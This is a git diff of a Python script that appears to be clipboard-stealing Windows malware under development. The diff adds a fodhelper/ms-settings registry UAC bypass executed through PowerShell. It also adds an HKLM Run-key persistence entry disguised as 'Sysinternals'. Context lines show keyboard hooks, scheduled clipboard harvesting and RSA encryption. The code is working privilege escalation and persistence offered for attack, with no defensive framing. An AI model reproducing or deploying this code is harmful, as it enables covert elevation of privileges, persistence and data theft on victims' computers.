@@ -6,10 +6,13 @@ import schedule
 import time
 
 from fontTools.merge.util import first
+import subprocess
 from pynput import keyboard
 import keyboard
 import rsa
 import  winreg
+import pyuac
+import win32security
 
 #TODO: EDIT BEFORE REPOSTING
 #invisible character idea is cool to fuck with clipboard!!!, makes it less obvious
@@ -24,16 +27,79 @@ public = rsa.PublicKey(
         65537)
 
 def main():
+    #if not pyuac.isUserAdmin():
+    # If not running as admin, set reg keys to execute the script with bypassing User Account Control (UAC)
+    my_env = os.environ.copy()
+    my_env['COMSPEC'] = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+
+    cmd = ["New-Item", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Force | Out-Null"]
+    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, env = my_env)
+    print(result)
+    #using exe path...
+    cmd2 = ["Set-ItemProperty", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Name", "(Default)", "-Value",
+                "$MyInvocation.MyCommand.Path", "-Force" ]
+    result = subprocess.run(cmd2, shell=True, capture_output=True, text=True, env = my_env)
+    print(result)
+
+    cmd3 = ["New-ItemProperty", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command", "-Name",
+                "DelegateExecute", "-PropertyType",
+                "String", "-Force | Out-Null"]
+    result = subprocess.run(cmd3, shell=True, capture_output=True, text=True, env = my_env)
+    print(result)
+
+    cmd4 = ["Start-Process", "fodhelper.exe", "-WindowStyle", "Hidden"]
+    result = subprocess.run(cmd4, shell=True, capture_output=True, text=True, env = my_env)
+    print(result)
+
+    #New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
+    #Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value $value -Force
+    #New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -PropertyType String -Force | Out-Null
+
+    # Trigger the UAC prompt by running fodhelper
+    #Start-Process "fodhelper.exe" -WindowStyle Hidden
+    #exit()
+
+    # UAC bypassed here!
+
+    # Exit the script to allow the rest run as admin
+    #problem is it pops up a service
+    #if not pyuac.isUserAdmin():
+        #cmd2 = ["Start - Process", "fodhelper.exe", "- WindowStyle", "Hidden"]
+        #result2 = subprocess.run(cmd2, shell=True, capture_output=True, text=True)
+        #print("Re-launching as admin!")
+        #pyuac.runAsAdmin()
+        #print(result2)
+        # Already an admin here.
 
     location = winreg.HKEY_CURRENT_USER
 
     #r is needed for backspacing characters
-    path = winreg.OpenKeyEx(location, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", winreg.KEY_ALL_ACCESS)
+    #path = winreg.OpenKeyEx(location, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", winreg.KEY_ALL_ACCESS)
+    #this needs to be here
+    #cmd = ["reg", "add", "HKLM\\Software\\MyCo2"]
+    #reg add <key> [/v <value>] [/t <type>] [/d <data>]
+
+    #"/v KeyTest", "/t REG_SZ", "/d 10"
+
+    current:str = os.path.abspath(__file__)
+    #TODO: PRIVILEGE ESCALATION OR THIS WON'T WORK
+    #TODO: I have thi sin a run key that is created, need it to actually get the correct file path and run the script
+    #TODO: research why script is not running how it should...
+    cmd5 = ["reg", "add", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Sysinternals", "/t", "REG_SZ", "/d", current]
+    #TODO: https://stackoverflow.com/questions/19672352/how-to-run-script-with-elevated-privilege-on-windows, use this to run as admin
+    #reg add HKLM\Software\MyCo TODO: this works but only in admin mode so need to enable admin running!!!
+    #os.system(cmd)
+    #subprocess.run(cmd, shell=True)
+    #typically runs in cmd.exe
+    result = subprocess.run(cmd5, shell=True, capture_output=True, text=True, env = my_env)
+
+    #result = subprocess.run(["dir"], shell=True, capture_output=True, text=True)
+    print(result)
     #os system and regedit
     #first_key = winreg.CreateKey(path, "Discord")
 
     current = os.path.abspath(__file__)
-    winreg.SetValueEx(path, "Sysinternals", 0, winreg.REG_SZ, current)
+    #winreg.SetValueEx(path, "Sysinternals", 0, winreg.REG_SZ, current)
     #TODO: COULD ADD THE PERSISTENCE MECHANISM...
     #
 
@@ -41,7 +107,7 @@ def main():
     schedule.every(90).seconds.do(get_clipboard_info)
 
     #Reestablishes the persistence mechanisms
-    schedule.every(45).seconds.do(reestablish)
+    #schedule.every(45).seconds.do(reestablish)
 
     #Adds a hotkey, can't have parenthesis becasue it returns as a none type instead of a boolean
     #explore the timeout feature to add some more functionality
